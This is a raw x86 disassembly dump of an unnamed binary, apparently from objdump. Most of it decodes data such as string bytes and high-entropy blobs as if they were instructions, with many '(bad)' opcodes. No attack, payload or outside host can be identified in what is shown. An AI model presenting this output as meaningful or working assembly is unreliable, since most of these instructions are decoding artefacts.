  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	pop    eax
  413f01:	je     0x413f56
  413f03:	push   eax
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0xc4000001
  413f0d:	call   0x3cda:0x22fdfa4c
  413f14:	add    edx,DWORD PTR [ebx]
  413f16:	into   
  413f17:	jmp    0x3263:0xa55c88df
  413f1e:	shr    bl,1
  413f20:	lock je 0x413f6c
  413f23:	dec    ebp
  413f24:	fwait
  413f25:	ret    0x9cc0
  413f28:	fistp  QWORD PTR [ebx-0x7a]
  413f2b:	je     0x413ec5
  413f2d:	pushf  
  413f2e:	(bad)  
  413f2f:	repz push es
  413f31:	add    eax,0xf4d906fd
  413f36:	and    ah,BYTE PTR ss:[eax+0x11]
  413f3a:	xor    al,0x55
  413f3c:	loop   0x413f9b
  413f3e:	arpl   ax,dx
  413f40:	push   ebx
  413f41:	or     esp,edx
  413f43:	cs aam 0x49
  413f46:	in     eax,0x75
  413f48:	lea    ecx,[esi+0x4d]
  413f4b:	cmp    esp,DWORD PTR [ebx]
  413f4d:	lods   al,BYTE PTR ds:[esi]
  413f4e:	mov    ebx,0x4f1c2315
  413f53:	sub    al,0x68
  413f55:	push   esp
  413f56:	push   ds
  413f57:	mov    al,0xa
  413f59:	and    al,0x8
  413f5b:	mov    bh,0xb8
  413f5d:	mov    edi,0xc0bf48cf
  413f62:	es cld 
  413f64:	mov    esi,0x408f8e0d
  413f69:	lea    ebx,[edi+0x3b]
  413f6c:	int3   
  413f6d:	lds    ebp,FWORD PTR fs:[edx+edi*2-0x7cb3027a]
  413f75:	dec    esp
  413f76:	scas   eax,DWORD PTR es:[edi]
  413f77:	pop    es
  413f78:	outs   dx,DWORD PTR ds:[esi]
  413f79:	cmp    al,0x3d
  413f7b:	sahf   
  413f7c:	inc    ecx
  413f7d:	inc    ebx
  413f7e:	test   BYTE PTR [esi-0x1a5020d7],cl
  413f84:	std    
  413f85:	idiv   DWORD PTR [ebx]
  413f87:	arpl   WORD PTR [ecx-0x6a],si
  413f8a:	test   eax,0xa82397e6
  413f8f:	mov    esi,0x9a488173
  413f94:	push   cs
  413f95:	add    BYTE PTR gs:[ecx+0x5b],bl
  413f99:	ficom  DWORD PTR [ebp+eiz*4-0x58bf32c0]
  413fa0:	aaa    
  413fa1:	lahf   
  413fa2:	adc    al,BYTE PTR [eax-0xd]
  413fa5:	pop    ecx
  413fa6:	xchg   ebp,eax
  413fa7:	loop   0x413fba
  413fa9:	fisub  DWORD PTR [ebp-0x7dfded33]
  413faf:	xchg   edi,eax
  413fb0:	sub    bh,BYTE PTR [eax-0x6b]
  413fb3:	leave  
  413fb4:	(bad)  
  413fb5:	lahf   
  413fb6:	inc    esi
  413fb7:	ret    
  413fb8:	dec    esi
  413fb9:	in     al,dx
  413fba:	xchg   ebx,eax
  413fbb:	jmp    FWORD PTR [edi-0x4f]
  413fbe:	icebp  
  413fbf:	jle    0x413f5d
  413fc1:	lock xchg ebp,eax
  413fc3:	pop    DWORD PTR [edi+0x61]
  413fc6:	das    
  413fc7:	pop    es
  413fc8:	sub    BYTE PTR [edx+0x3d],ch
  413fcb:	test   BYTE PTR [esp+ebx*1+0x4f],bh
  413fcf:	dec    edx
  413fd0:	aaa    
  413fd1:	push   edx
  413fd2:	mov    bh,0x6e
  413fd4:	or     eax,0x83e79716
  413fd9:	js     0x414012
  413fdb:	call   0xca595283
  413fe0:	and    esi,DWORD PTR [esi]
  413fe2:	and    al,BYTE PTR [edx+0x2e1d9e58]
  413fe8:	cmp    al,0x2d
  413fea:	push   ecx
  413feb:	test   al,0xd3
  413fed:	inc    ebx
  413fee:	icebp  
  413fef:	addr16 dec esi
  413ff1:	or     eax,0x47b1336f
  413ff6:	mov    ecx,0x7e8013ee
  413ffb:	(bad)  
  413ffc:	dec    edx
  413ffd:	aam    0x98
  413fff:	xor    ecx,DWORD PTR [eax+0x1b]
  414002:	scas   eax,DWORD PTR es:[edi]
  414003:	pop    ds
  414004:	xchg   ecx,eax
  414005:	sub    edx,0x1b
  414008:	pushf  
  414009:	jmp    FWORD PTR [esi+0x13]
  41400c:	ins    DWORD PTR es:[edi],dx
  41400d:	and    al,0xea
  41400f:	sti    
  414010:	imul   eax,DWORD PTR [eax],0x0
	...
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x5b5d:0xf6d52e96
  414083:	retf   0xd2e1
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x67000001
  41408d:	dec    ebx
  41408e:	push   esi
  41408f:	xchg   ebx,eax
  414090:	sub    DWORD PTR [eax-0x5a],edi
  414093:	stos   BYTE PTR es:[edi],al
  414094:	jmp    0x9526:0xe8116719
  41409b:	sbb    eax,0xa3e78816
  4140a0:	(bad)  
  4140a1:	jo     0x414104
  4140a3:	out    0xd3,eax
  4140a5:	and    DWORD PTR [edx+edx*1],0xd637cabf
  4140ac:	inc    edi
  4140ad:	mov    ah,0xb1
  4140af:	in     eax,0x10
  4140b1:	imul   ebp,DWORD PTR [ebx-0x7793c669],0xffffffcb
  4140b8:	jg     0x414100
  4140ba:	repnz push ecx
  4140bc:	sbb    eax,0x988c4fe8
  4140c1:	je     0x41406d
  4140c3:	or     ebx,DWORD PTR [edx]
  4140c5:	aaa    
  4140c6:	xchg   esp,eax
  4140c7:	push   edi
  4140c8:	pop    esi
  4140c9:	ficom  DWORD PTR [edi-0xc]
  4140cc:	test   eax,0x6f6bb307
  4140d1:	sub    eax,0xc28875b2
  4140d6:	ss test al,0x2d
  4140d9:	or     ecx,DWORD PTR [eax-0x3]
  4140dc:	ss push edi
  4140de:	rcl    DWORD PTR [ebx],cl
  4140e0:	inc    eax
  4140e1:	or     ch,BYTE PTR [ecx+ebp*2-0x49bc018a]
  4140e8:	push   eax
  4140e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ea:	lods   eax,DWORD PTR ds:[esi]
  4140eb:	xor    al,BYTE PTR [edx]
  4140ed:	cmc    
  4140ee:	test   DWORD PTR [esi],edi
  4140f0:	adc    ch,BYTE PTR [edx-0x2c]
  4140f3:	jmp    0x7b383a65
  4140f8:	cmp    dh,BYTE PTR [esi]
  4140fa:	xor    BYTE PTR [ebp+0x56acbd6a],bl
  414100:	ja     0x41414a
  414102:	adc    eax,0x38a1ecc6
  414107:	stos   DWORD PTR es:[edi],eax
  414108:	pop    eax
  414109:	stos   BYTE PTR es:[edi],al
  41410a:	mov    ah,0x51
  41410c:	mov    cl,0xf
  41410e:	dec    esp
  41410f:	test   eax,0xc5d43129
  414114:	out    0xf8,al
  414116:	mov    ebp,0x4da86914
  41411b:	(bad)  
  41411c:	add    al,0x53
  41411e:	ficom  DWORD PTR ds:0x614da708
  414124:	mov    ebx,0x862f8cea
  414129:	cmp    BYTE PTR [edi],al
  41412b:	outs   dx,BYTE PTR ds:[esi]
  41412c:	cmc    
  41412d:	xor    DWORD PTR [ebx-0x4b],ebp
  414130:	leave  
  414131:	xor    al,0xe2
  414133:	sahf   
  414134:	mov    al,BYTE PTR [eax-0x14]
  414137:	cmp    al,0xec
  414139:	call   0xf42b:0x24c7f9ba
  414140:	jmp    0x82ee093c
  414145:	xchg   edi,eax
  414146:	(bad)  
  414147:	ds xchg esp,eax
  414149:	out    0xc0,eax
  41414b:	(bad)  
  41414c:	cmp    BYTE PTR ds:0x9d2011bf,ah
  414152:	add    eax,0x87bde56a
  414157:	add    ebp,ebp
  414159:	(bad)  
  41415a:	std    
  41415b:	dec    edi
  41415c:	pop    es
  41415d:	xchg   ebx,eax
  41415e:	cmp    cl,BYTE PTR [ebp-0x57]
  414161:	(bad)  
  414164:	pop    ds
  414165:	jo     0x4141c7
  414167:	dec    ebx
  414168:	xor    BYTE PTR [ecx-0x20],dl
  41416b:	ds sti 
  41416d:	rcr    BYTE PTR [esi+0x5f3de811],0xc8
  414174:	xor    eax,0xaf533cb9
  414179:	into   
  41417a:	push   ecx
  41417b:	adc    al,0x3a
  41417d:	movups xmm3,XMMWORD PTR [edx+edi*4-0x53]
  414182:	or     ah,BYTE PTR [edi]
  414184:	rcl    DWORD PTR [edi],cl
  414186:	and    ebp,DWORD PTR [ebp-0x70]
  414189:	mov    dl,0x7a
  41418b:	mov    ebx,0x673b4d88
  414190:	adc    BYTE PTR [eax],al
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	fidiv  WORD PTR [ebx-0x2c199938]
  414206:	add    BYTE PTR [eax],al
  414208:	add    eax,0x16000001
  41420d:	(bad)  
  41420e:	outs   dx,DWORD PTR ds:[esi]
  41420f:	mov    ds:0xec59c236,eax
  414214:	push   ds
  414215:	add    esp,DWORD PTR [eax]
  414217:	push   0x783d624f
  41421c:	ds dec ebp
  41421e:	lds    esp,FWORD PTR [eax-0x17622d4f]
  414224:	imul   edx,esi,0x2d
  414227:	sub    DWORD PTR [edx],edx
  414229:	mov    ?,WORD PTR [ebp+ebx*1-0x2a]
  41422d:	jmp    0x41428d
  41422f:	mov    dh,bh
  414231:	leave  
  414232:	cmp    al,0x5c
  414234:	lods   eax,DWORD PTR ds:[esi]
  414235:	push   ebx
  414236:	ins    BYTE PTR es:[edi],dx
  414237:	ja     0x414229
  414239:	sub    DWORD PTR [esi-0x5caefe34],eax
  41423f:	rol    ebx,1
  414241:	dec    ebp
  414242:	cs in  al,0x2d
  414245:	ins    DWORD PTR es:[edi],dx
  414246:	fcomp  DWORD PTR [ebp-0x4f864be2]
  41424c:	call   0x1479:0xb30dd30a
  414253:	imul   eax,esp,0x1435d4ab
  414259:	or     edi,DWORD PTR [esi]
  41425b:	jl     0x414253
  41425d:	stos   DWORD PTR es:[edi],eax
  41425e:	mov    edx,0xced65e22
  414263:	out    dx,eax
  414264:	cmp    eax,0x7153cc7d
  414269:	das    
  41426a:	dec    edi
  41426b:	add    BYTE PTR [ecx],dh
  41426d:	push   0xffffffe4
  41426f:	call   0xb439:0x168fe55a
  414276:	arpl   WORD PTR [edi-0x78],ax
  414279:	mov    bl,0x8d
  41427b:	and    DWORD PTR [edi+0x5187d282],0x19
  414282:	pop    edi
  414283:	jg     0x4142a8
  414285:	test   eax,0x10757e73
  41428a:	ret    
  41428b:	cli    
  41428c:	(bad)  
  41428d:	loop   0x41426c
  41428f:	jge    0x414233
  414291:	xlat   BYTE PTR ds:[ebx]
  414292:	fs push eax
  414294:	jmp    0x414245
  414296:	sbb    BYTE PTR [edi],0x7
  414299:	mov    edx,0xc99d5f7
  41429e:	push   esp
  41429f:	xor    esi,DWORD PTR [edi]
  4142a1:	dec    eax
  4142a2:	xlat   BYTE PTR ds:[ebx]
  4142a3:	mov    eax,ds:0x9e90df82
  4142a8:	fcmovb st,st(5)
  4142aa:	in     al,0x5c
  4142ac:	out    dx,eax
  4142ad:	mov    eax,ds:0x1b510f04
  4142b2:	fidivr DWORD PTR [eax]
  4142b4:	retf   0x447f
  4142b7:	fisub  DWORD PTR [edi+0x4083b78a]
  4142bd:	pop    ecx
  4142be:	jmp    0x41429e
  4142c0:	pop    ds
  4142c1:	outs   dx,BYTE PTR ds:[esi]
  4142c2:	or     edx,DWORD PTR [edi+0x5293a9b6]
  4142c8:	in     eax,0x8f
  4142ca:	out    0xe1,al
  4142cc:	call   0x8b72348b
  4142d1:	push   eax
  4142d2:	ins    BYTE PTR es:[edi],dx
  4142d3:	stos   DWORD PTR es:[edi],eax
  4142d4:	push   ebx
  4142d5:	inc    edx
  4142d6:	inc    esi
  4142d7:	pop    ss
  4142d8:	dec    ebp
  4142d9:	scas   eax,DWORD PTR es:[edi]
  4142da:	scas   al,BYTE PTR es:[edi]
  4142db:	std    
  4142dc:	data16 aam 0xfd
  4142df:	mov    edx,0xd9329ca8
  4142e4:	pushf  
  4142e5:	in     al,0x93
  4142e7:	data16 daa 
  4142e9:	icebp  
  4142ea:	(bad)  
  4142eb:	pop    ds
  4142ec:	sbb    dl,dl
  4142ee:	mov    dh,0xa1
  4142f0:	mov    al,ds:0x26ef287b
  4142f5:	mov    dh,0xe2
  4142f7:	pusha  
  4142f8:	mov    fs,WORD PTR [ecx+0x556dd89e]
  4142fe:	mov    ah,0x72
  414300:	pop    esp
  414301:	adc    eax,0x74ad0d3d
  414306:	xlat   BYTE PTR fs:[ebx]
  414308:	sbb    BYTE PTR [ecx+0x68afe6d],ch
  41430e:	jae    0x414339
  414310:	retf   0x0
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	cmp    eax,0xebeab974
  414385:	aam    0x0
  414387:	add    BYTE PTR ds:0xa5000001,al
  41438d:	xchg   ebx,eax
  41438e:	push   0x7d
  414390:	test   DWORD PTR [ebx+0x43e7028a],edx
  414396:	mul    DWORD PTR [eax-0x277c94c9]
  41439c:	rep outs dx,BYTE PTR ds:[esi]
  41439e:	inc    eax
  41439f:	frstor ss:[ebx+0x6c9562d7]
  4143a6:	sbb    DWORD PTR [esi-0x32d320],ebx
  4143ac:	push   cs
  4143ad:	jge    0x414426
  4143af:	or     BYTE PTR [edi],dh
  4143b1:	mov    dh,0x9c
  4143b3:	mov    ds:0x574def51,eax
  4143b8:	sbb    DWORD PTR [ecx-0x25bfe5be],ebp
  4143be:	je     0x414382
  4143c0:	xchg   esp,eax
  4143c1:	(bad)  
  4143c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c3:	mov    DWORD PTR [esi+edx*4+0x41],edi
  4143c7:	inc    ebp
  4143c8:	call   0x2bf6555a
  4143cd:	adc    esi,edi
  4143cf:	inc    ebp
  4143d0:	test   eax,0xa8580432
  4143d5:	push   0xaa07e0
  4143da:	les    edx,FWORD PTR [ecx+ebx*2+0x1f]
  4143de:	xchg   ecx,eax
  4143df:	scas   al,BYTE PTR es:[edi]
  4143e0:	sbb    eax,DWORD PTR [edi+ebx*4]
  4143e3:	push   ss
  4143e4:	in     eax,0x68
  4143e6:	adc    DWORD PTR [ecx],0x35
  4143e9:	mov    dh,0xdd
  4143eb:	mov    edx,0x46e3dbd2
  4143f0:	je     0x4143a4
  4143f2:	repnz mov cl,0xa0
  4143f5:	aas    
  4143f6:	fldenv cs:[eax+0x1cf4349c]
  4143fd:	jb     0x414449
  4143ff:	adc    BYTE PTR [ecx],0x6a
  414402:	dec    ebx
  414403:	loop   0x4143f4
  414405:	outs   dx,BYTE PTR ds:[esi]
  414406:	js     0x414469
  414408:	cli    
  414409:	fsubr  st,st(7)
  41440b:	xchg   edx,eax
  41440c:	and    DWORD PTR ds:0x6475f9d0,0x6bdadbfe
  414416:	popa   
  414417:	xor    DWORD PTR [ecx+edi*1],eax
  41441a:	pusha  
  41441b:	rol    bh,0x23
  41441e:	jg     0x414434
  414420:	xchg   edi,eax
  414421:	and    ebp,esp
  414423:	xchg   edx,eax
  414424:	dec    eax
  414425:	mov    ah,0x58
  414427:	pop    edx
  414428:	aam    0x5a
  41442a:	xor    ebp,DWORD PTR [edx+0x6f]
  41442d:	xchg   ecx,eax
  41442e:	icebp  
  41442f:	test   DWORD PTR [edx+edx*2-0x2ac240b1],ecx
  414436:	mov    dh,0x94
  414438:	fcom   DWORD PTR ds:0x1f602b8e
  41443e:	cmp    DWORD PTR [edx],ebp
  414440:	sbb    al,BYTE PTR [esi-0x42424f94]
  414446:	push   ecx
  414447:	je     0x414400
  414449:	jbe    0x4144c5
  41444b:	rcr    BYTE PTR [ebp+0x44],cl
  41444e:	(bad)  
  41444f:	fst    QWORD PTR [edx-0x25]
  414452:	jl     0x41447b
  414454:	cmc    
  414455:	sbb    ebp,DWORD PTR [edi-0x65]
  414458:	mov    al,0x34
  41445a:	dec    ebp
  41445b:	inc    edx
  41445c:	mov    ch,0x38
  41445e:	sub    al,0xef
  414460:	xchg   ecx,eax
  414461:	or     esi,DWORD PTR [ecx]
  414463:	(bad)  
  414464:	jle    0x4144d9
  414466:	js     0x4144a7
  414468:	pop    gs
  41446a:	jnp    0x41444e
  41446c:	cmp    esi,DWORD PTR [edx+0x633ed8d3]
  414472:	call   0x3a2f:0x1b591061
  414479:	jg     0x41442a
  41447b:	call   0x6e607f98
  414480:	xor    cl,BYTE PTR [ebx+0x67]
  414483:	or     eax,0x2e02f89c
  414488:	add    ecx,DWORD PTR [esi-0x74]
  41448b:	loopne 0x41440e
  41448d:	in     al,0x29
  41448f:	ins    DWORD PTR es:[edi],dx
  414490:	int    0x0
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x12]
  414501:	loope  0x41450b
  414503:	sbb    al,0xf0
  414505:	aad    0x0
  414507:	add    BYTE PTR ds:0x9000001,al
  41450d:	div    DWORD PTR [ebx+0x74]
  414510:	inc    ecx
  414511:	int3   
  414512:	or     dh,BYTE PTR [edi+0x22216a42]
  414518:	loope  0x414583
  41451a:	adc    al,0x98
  41451c:	cld    
  41451d:	ds fs mov ebx,0xaab6999d
  414524:	and    ebx,DWORD PTR [ebx+0x59]
  414527:	mov    ebx,0xc5b9a180
  41452c:	adc    BYTE PTR [edx-0x3ac6ef8d],0xb0
  414533:	pop    ss
  414534:	inc    eax
  414535:	ins    DWORD PTR es:[edi],dx
  414536:	push   ecx
  414537:	ret    0x79cc
  41453a:	aam    0x5b
  41453c:	inc    ebp
  41453d:	sti    
  41453e:	dec    edx
  41453f:	fnstcw WORD PTR ds:0xbcb8b4a6
  414545:	or     al,0x6a
  414547:	mov    esp,0x985eb445
  41454c:	push   0xe2ecce9f
  414551:	sti    
  414552:	adc    BYTE PTR [edx-0x6da8fcd],dl
  414558:	int    0x23
  41455a:	je     0x414535
  41455c:	push   ecx
  41455d:	sbb    ebx,eax
  41455f:	sbb    al,0x1
  414561:	jp     0x414542
  414563:	xor    edi,ecx
  414565:	jp     0x41456a
  414567:	pop    esp
  414568:	jmp    0xc70256d5
  41456d:	dec    ebp
  41456e:	pop    ebp
  41456f:	sub    DWORD PTR [esi-0x5c6fafe0],ebx
  414575:	out    0xd5,al
  414577:	das    
  414578:	in     al,0x9f
  41457a:	aad    0x88
  41457c:	adc    esi,DWORD PTR [ebx+ebx*8-0x2538ad3d]
  414583:	shr    DWORD PTR [esi-0x2eee6984],cl
  414589:	es aaa 
  41458b:	retf   0x6f69
  41458e:	loopne 0x414585
  414590:	inc    edx
  414591:	xchg   ebp,eax
  414592:	dec    edi
  414593:	sbb    DWORD PTR [eax+0x1b],ecx
  414596:	lods   eax,DWORD PTR ds:[esi]
  414597:	aam    0x65
  414599:	call   0xf29016f8
  41459e:	(bad)
  4145a2:	xchg   BYTE PTR [ecx],al
  4145a4:	aaa    
  4145a5:	mov    DWORD PTR [ebx-0x19],eax
  4145a8:	popa   
  4145a9:	add    al,0xa0
  4145ac:	xchg   BYTE PTR [edx],al
  4145ae:	dec    eax
  4145af:	jmp    0x4145de
  4145b1:	add    eax,0xa9d9b19f
  4145b6:	jo     0x4145f8
  4145b8:	mov    ecx,0x7e410369
  4145bd:	es pop edx
  4145bf:	jnp    0x41461c
  4145c1:	add    DWORD PTR [ebx-0x75],edx
  4145c4:	loop   0x414644
  4145c6:	fadd   DWORD PTR [esi]
  4145c8:	test   DWORD PTR [eax],ebx
  4145ca:	stc    
  4145cb:	lods   al,BYTE PTR ds:[esi]
  4145cc:	push   0xe73206a8
  4145d1:	adc    DWORD PTR ds:[edi-0x53],esp
  4145d5:	xchg   DWORD PTR [edx-0x6da31cc2],edi
  4145db:	dec    eax
  4145dc:	repnz mov ds:0x483697fd,al
  4145e2:	mov    ebx,0xfb06994c
  4145e7:	or     ebp,DWORD PTR [esi+0x16]
  4145ea:	into   
  4145eb:	scas   eax,DWORD PTR es:[edi]
  4145ec:	leave  
  4145ed:	sbb    BYTE PTR [edx+0x276d8d3a],bl
